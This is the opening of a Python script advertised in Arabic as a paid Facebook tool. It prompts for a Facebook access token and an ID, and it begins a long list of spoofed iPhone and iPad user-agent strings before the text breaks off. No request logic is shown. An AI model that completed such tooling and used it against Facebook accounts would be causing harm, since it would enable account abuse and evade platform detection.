import requests 
print(('\033[92m—'*25)+'\n• BY : SAIF | @PYTPT •\n'+('—'*25))
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
O = '\x1b[38;5;202m' # ORANGE.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C1 = '\033[2;35m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
import requests
import rich
import os
os.system('termcolor')
os.system('clear')
from termcolor import colored
os.system('clear')
text = """

⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⢦⣀⡈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⡄⠙⠛⢿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⢀⣤⣤⣾⣿⠧⠀⠀⠈⢿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠃⠀⠉⠉⠀⠀⠀⠀⢀⣀⣠⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠇⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠋⢀⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⢈⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⠀⠸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠈⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⣾⣿⠃⠀⠀⠀⠀⣸⡆⠀⠀⠀⠀⠀⢣⡀⠻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⢀⣿⣿⡀⠀⠀⠀⠀⢀⣵⡀⠙⣻⣿⣿
⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⢸⣿⣿⣧⠀⠀⠀⠀⠈⢻⣿⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣤⠀⠀⢀⣀⣼⣿⣿⣿⡄⠀⠀⠀⢴⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠈⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠇⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠁⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠘⣿⣿⣿
⣿⡿⠛⠉⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠈⠻⣿
⣿⣷⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣤⣤::
                                          
"""

rainbow_colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
colored_lines = []

lines = text.split('\n')
for index, line in enumerate(lines):
    colored_line = colored(line, rainbow_colors[index % len(rainbow_colors)])
    colored_lines.append(colored_line)

colored_text = '\n'.join(colored_lines)
print(colored_text)
#-----------------[ IMPORT-MODULE ]-----------------
import requests,bs4,json,os,sys,random,datetime,time,re
import webbrowser
import os
firasid=[]
import urllib3,rich,base64
import threading
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
try:
    import requests
except ImportError:
	Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
#-------------------#
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33'
#-------------------#
print (C+'اهــلا بــك فــي اداتــي المــدفــوعــة')
print('\n')
token=input(F+'𝙏𝙊𝙆𝙀𝙉 ➥ '+X)
print('\n')
ID=input(Y+'𝐈𝐃 ➥ '+R)
os.system('clear')
cetak(nel('\t• WELCOME MY TOOL FACEBOOK •'))
os.system('clear')
os.system('clear')
pretty.install()
CON = sol()
RAJY = [
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_2 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7D11 Safari/528.16',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7E18',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_4 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; nl-nl) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; fr-fr) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A306 Safari/6531.22.7',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; ko-kr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F191',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_4 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_6 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8E200',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F191',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; nl-nl) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; sv-se) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148a',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
